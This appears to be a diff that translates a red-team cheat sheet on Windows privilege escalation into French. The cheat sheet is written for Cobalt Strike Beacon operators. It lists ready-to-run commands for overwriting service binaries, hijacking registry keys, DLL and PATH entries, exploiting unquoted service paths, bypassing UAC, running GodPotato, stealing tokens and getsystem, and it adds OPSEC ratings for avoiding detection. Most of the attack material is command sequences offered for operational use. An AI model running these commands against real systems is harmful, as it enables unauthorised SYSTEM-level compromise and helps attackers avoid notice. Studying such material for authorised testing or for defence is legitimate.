@@ -1,6 +1,6 @@
-# Privilege Escalation  
+# Privilege Escalation — Élévation de privilèges  
 
->Once initial persistence obtained and post exploitation performed, the ***Privilege Escalation*** phase is initiated.  
+>Après la Persistence initiale et la Post-Exploitation, la phase de **Privilege Escalation** commence.  
 
 * Path Interception
 * Weak Service Permissions
@@ -10,15 +10,15 @@
 
 ---
 
-## Account Context — Know Where You Stand
+## Contexte du compte — Identifier ses privilèges
 
-| Account | Integrity Level | Notes |
+| Compte | Integrity Level | Remarques |
 |---------|----------------|-------|
-| Standard User | Medium | No access outside own files |
-| Local Admin (no UAC elevation) | Medium | Group membership ≠ high integrity |
-| Local Admin (elevated) | High | UAC-consented process |
-| LocalService / NetworkService | Low–Medium | SCM-managed; network auth differs |
-| SYSTEM / LocalSystem | System | Highest — exceeds local admin in some cases |
+| Standard User | Medium | Accès limité à ses propres fichiers |
+| Local Admin (sans élévation UAC) | Medium | Appartenir au groupe Admin ne signifie pas high integrity |
+| Local Admin (élevé) | High | Processus autorisé par UAC |
+| LocalService / NetworkService | Low–Medium | Gérés par SCM ; authentification réseau différente |
+| SYSTEM / LocalSystem | System | Niveau supérieur aux droits admin locaux dans certains cas |
 
 ```cs
 // Check current integrity level and token
@@ -26,25 +26,25 @@ beacon> getuid
 beacon> whoami /groups     // via shell — look for "High Mandatory Level"
 ```
 
-**Key point:** Admin group membership is meaningless until you have a high-integrity token. UAC is the gatekeeper.
+**Point essentiel :** l'appartenance au groupe Administrators ne suffit pas sans token high integrity. UAC contrôle cette élévation.
 
 ---
 
-## Vulnerable Services — Attack Surface Overview
+## Services vulnérables — Surface d'attaque
 
-| Misconfiguration | Technique | MITRE |
+| Mauvaise configuration | Technique | MITRE |
 |-----------------|-----------|-------|
-| Writable service binary | Service File Permissions | T1574.010 |
-| Writable service registry key | Service Registry Permissions | T1574.011 |
-| Missing DLL, writable exec dir | DLL Search Order Hijacking | T1574.001 |
-| Writable dir in SYSTEM PATH | PATH Environment Variable | T1574.007 |
-| Relative binary reference, writable dir | Search Order Hijacking | T1574.008 |
-| Unquoted binary path with spaces | Unquoted Service Path | T1574.009 |
-| Vulnerable elevated software | Software Exploitation | T1068 |
+| Binaire de service modifiable | Service File Permissions | T1574.010 |
+| Clé Registry du service modifiable | Service Registry Permissions | T1574.011 |
+| DLL manquante, dossier exécutable modifiable | DLL Search Order Hijacking | T1574.001 |
+| Dossier modifiable dans PATH SYSTEM | PATH Environment Variable | T1574.007 |
+| Référence relative au binaire, dossier modifiable | Search Order Hijacking | T1574.008 |
+| Chemin de binaire avec espaces sans guillemets | Unquoted Service Path | T1574.009 |
+| Logiciel privilégié vulnérable | Software Exploitation | T1068 |
 
 ---
 
-## Enumeration — Finding Privesc Vectors
+## Énumération — Identifier les vecteurs de Privilege Escalation
 
 ### OPSEC: CAUTION (fork & run)
 ```cs
@@ -68,10 +68,10 @@ beacon> shell env
 
 ---
 
-## Weak Service File Permissions
+## Weak Service File Permissions — Permissions des fichiers service
 
-**Condition:** Service binary ACL allows standard user write access.  
-**Exploit:** Overwrite binary with payload → restart service → payload runs as SYSTEM.
+**Condition :** les ACL du binaire du service accordent l'écriture à un utilisateur standard.  
+**Exploitation :** remplacer le binaire par un payload, puis redémarrer le service pour l'exécuter sous SYSTEM.
 
 ```cs
 // 1. Verify writable ACL on binary
@@ -87,15 +87,15 @@ beacon> shell sc stop VulnService
 beacon> shell sc start VulnService
 ```
 
-**Note:** Cannot overwrite binary while service is running. Stop first.  
-**Destructive:** Original binary is overwritten — document and restore if needed.
+**Attention :** le binaire ne peut pas être remplacé tant que le service s'exécute. L'arrêter au préalable.  
+**Modification destructive :** le binaire d'origine est écrasé. Documenter et restaurer si nécessaire.
 
 ---
 
-## Weak Service Registry Permissions
+## Weak Service Registry Permissions — Permissions Registry
 
-**Condition:** Service registry key ACL allows standard user write access.  
-**Exploit:** Modify `ImagePath` to point to payload → restart service.
+**Condition :** les ACL de la clé Registry du service accordent l'écriture à un utilisateur standard.  
+**Exploitation :** modifier `ImagePath` pour pointer vers le payload, puis redémarrer le service.
 
 ```cs
 // Check registry key permissions
@@ -109,23 +109,23 @@ beacon> shell sc stop VulnService
 beacon> shell sc start VulnService
 ```
 
-### Performance Key Abuse (Clément Labro technique)
-**Condition:** Writable service registry key — no need to modify ImagePath.  
-**Exploit:** Add `Performance` subkey pointing to a malicious DLL. Does not disrupt normal service operation.
+### Performance Key Abuse — Technique de Clément Labro
+**Condition :** la clé Registry du service est accessible en écriture, sans modifier `ImagePath`.  
+**Exploitation :** ajouter une sous-clé `Performance` pointant vers une DLL, sans interrompre le fonctionnement normal du service.
 
 ---
 
 ## DLL Search Order Hijacking
 
-**DLL search order (standard applications):**
-1. Executing directory (binary's own dir)
+**Ordre de recherche des DLL (applications standards) :**
+1. Dossier de l'exécutable (emplacement du binaire)
 2. System32
-3. 16-bit System directory
-4. Windows directory
-5. Current working directory
-6. PATH environment variable directories
+3. Dossier System 16-bit
+4. Dossier Windows
+5. Working directory courant
+6. Dossiers présents dans la variable d'environnement PATH
 
-**Condition:** Service binary loads a DLL by name only (relative), and a directory higher in the search order is writable.
+**Condition :** le binaire du service charge une DLL par son nom relatif et un dossier prioritaire de la search order est modifiable.
 
 ```cs
 // 1. Check permissions on service executing directory
@@ -141,13 +141,13 @@ beacon> shell sc stop VulnService
 beacon> shell sc start VulnService
 ```
 
-**Note:** Use a reflective DLL payload — must export the functions the service expects (or use a null-export DLL if service doesn't verify).
+**Attention :** utiliser un payload DLL adapté, exportant les fonctions attendues par le service (ou une DLL sans export si aucune vérification n'est réalisée).
 
 ---
 
-## Path Interception — PATH Environment Variable
+## Path Interception — Variable d'environnement PATH
 
-**Condition:** A directory writable by standard users is prepended to the system PATH (often by software installers placing entries before System32).
+**Condition :** un dossier accessible en écriture aux utilisateurs standards précède System32 dans le PATH système, parfois à cause d'un installer.
 
 ```cs
 // 1. Enumerate PATH
@@ -165,14 +165,14 @@ beacon> shell copy beacon-svc.exe "C:\Scripts\timeout.exe"
 // 4. Wait for service/scheduled task to call the binary, OR restart
 ```
 
-**Note:** Drop as `timeout.exe` not `cmd.exe` — `cmd.exe` is protected by CreateProcess API behaviour.
+**Attention :** utiliser le nom `timeout.exe` plutôt que `cmd.exe`, ce dernier bénéficiant d'un traitement particulier par l'API CreateProcess.
 
 ---
 
 ## Path Interception — Unquoted Service Path
 
-**Condition:** Service binary path contains spaces and is not surrounded by quotes.  
-**Exploit:** CreateProcess interprets spaces as path separators and tries multiple interpretations.
+**Condition :** le chemin du binaire de service contient des espaces sans être entouré de guillemets.  
+**Exploitation :** CreateProcess peut interpréter les espaces comme des séparateurs et tester plusieurs chemins.
 
 ```
 Path: C:\Bad Program Files\Bad Service\service.exe
@@ -202,13 +202,13 @@ beacon> shell sc start VulnService
 // If can't restart — wait for reboot
 ```
 
-**Must use `svc.exe` payload format for service execution.**
+**Utiliser un payload au format `svc.exe` pour l'exécution en tant que service.**
 
 ---
 
-## Software Vulnerabilities (Deserialization Example)
+## Software Vulnerabilities — Exemple de désérialisation
 
-**Condition:** Elevated application deserialises attacker-controlled data.
+**Condition :** une application privilégiée désérialise des données contrôlées par l'attaquant.
 
 ```bash
 # Kali — generate malicious blob with ysoserial.net
@@ -228,9 +228,9 @@ beacon> shell copy data.bin "C:\VulnApp\data.bin"
 
 ## UAC Bypass
 
-**Condition:** Current user is local admin but beacon runs at medium integrity. Need high-integrity to perform admin actions.
+**Condition :** l'utilisateur est administrateur local, mais le Beacon est en medium integrity. Il faut un niveau high integrity pour les actions admin.
 
-### elevate — spawn new high-integrity Beacon session
+### elevate — Créer un nouveau Beacon high integrity
 ```cs
 // List available UAC exploits
 beacon> elevate
@@ -240,7 +240,7 @@ beacon> elevate uac-token-duplication <listener>
 beacon> elevate svc-exe <listener>
 ```
 
-### runasadmin — run arbitrary command at high integrity
+### runasadmin — Exécuter une commande en high integrity
 ```cs
 // List available elevators
 beacon> runasadmin
@@ -249,26 +249,26 @@ beacon> runasadmin
 beacon> runasadmin uac-token-duplication <command> <args>
 ```
 
-**After elevation:** Confirm with `getuid` — should show high-integrity context.
+**Après l'élévation :** vérifier avec `getuid` que le contexte est en high integrity.
 
 ---
 
-## Useful Privesc BOFs / Assemblies
+## BOF et assemblies utiles pour Privilege Escalation
 
-| Tool | Use | Command |
+| Outil | Utilité | Commande |
 |------|-----|---------|
-| **SharpUp** | Automated service/path misconfiguration audit | `execute-assembly SharpUp.exe audit` |
-| **Seatbelt** | Local host recon inc. UAC, token, user rights | `execute-assembly Seatbelt.exe -group=system` |
-| **PowerView** | Service enum via WMI | `powerpick Get-WmiObject Win32_Service` |
-| **Watson** | Missing patch / CVE check | `execute-assembly Watson.exe` |
-| **ysoserial.net** | .NET deserialisation gadget generator | Run on Kali — upload output |
+| **SharpUp** | Audit automatisé des mauvaises configurations services/chemins | `execute-assembly SharpUp.exe audit` |
+| **Seatbelt** | Reconnaissance locale : UAC, tokens et droits utilisateur | `execute-assembly Seatbelt.exe -group=system` |
+| **PowerView** | Énumération des services via WMI | `powerpick Get-WmiObject Win32_Service` |
+| **Watson** | Vérification des correctifs absents et CVE | `execute-assembly Watson.exe` |
+| **ysoserial.net** | Générateur de gadgets de désérialisation .NET | Run on Kali — upload output |
 
 ---
 
-## SeImpersonatePrivilege Abuse
+## Exploitation de SeImpersonatePrivilege
 
-**Condition:** Beacon running as NetworkService, LocalService, or a service account with `SeImpersonatePrivilege`.  
-**Exploit:** Potato-family exploits (PrintSpoofer, GodPotato, etc.) — impersonate SYSTEM token.
+**Condition :** Beacon sous NetworkService, LocalService ou un compte de service disposant de `SeImpersonatePrivilege`.  
+**Exploitation :** techniques de la famille Potato (PrintSpoofer, GodPotato, etc.) permettant l'impersonation d'un token SYSTEM.
 
 ```cs
 // Check current privileges
@@ -284,7 +284,7 @@ beacon> execute-assembly C:\Tools\GodPotato\GodPotato.exe -cmd "C:\Payloads\beac
 
 ---
 
-## getsystem — Built-in CS Primitive
+## getsystem — Fonction native Cobalt Strike
 
 ```
 OPSEC: CAUTION — tries multiple techniques internally, some noisy
@@ -296,7 +296,7 @@ beacon> getsystem
 beacon> getuid
 ```
 
-**Prefer explicit techniques (PrintSpoofer, token stealing) over getsystem for OPSEC score.**
+**Pour le score OPSEC, ces notes privilégient les techniques explicites (PrintSpoofer, token stealing) à getsystem.**
 
 ---
 
@@ -318,7 +318,7 @@ beacon> rev2self  // revert to original token
 
 ---
 
-## Quick Reference — Privesc Decision Tree
+## Référence rapide — Arbre de décision Privilege Escalation
 
 ```
 Low-priv beacon?
@@ -347,14 +347,14 @@ After every escalation:
 
 ---
 
-## OPSEC Summary
+## Récapitulatif OPSEC
 
-| Technique | OPSEC | Notes |
+| Technique | OPSEC | Remarques |
 |-----------|-------|-------|
-| `steal_token` | SAFE | No new process |
+| `steal_token` | SAFE | Aucun nouveau processus |
 | `execute-assembly SharpUp` | CAUTION | Fork & run |
-| `elevate uac-token-duplication` | CAUTION | Spawns new Beacon |
-| `getsystem` | CAUTION | Multiple internal attempts |
-| `shell sc stop/start` | UNSAFE | Spawns cmd.exe; service restart logged (Event 7036) |
-| Service binary overwrite | UNSAFE | Destructive; writes to disk |
-| DLL hijack drop | CAUTION | Writes to disk; triggered on service restart |
+| `elevate uac-token-duplication` | CAUTION | Crée un nouveau Beacon |
+| `getsystem` | CAUTION | Plusieurs tentatives internes |
+| `shell sc stop/start` | UNSAFE | Crée cmd.exe ; redémarrage de service enregistré (Event 7036) |
+| Remplacement du binaire de service | UNSAFE | Destructif ; écrit sur disque |
+| Dépôt DLL hijack | CAUTION | Écriture disque ; déclenché au redémarrage du service |
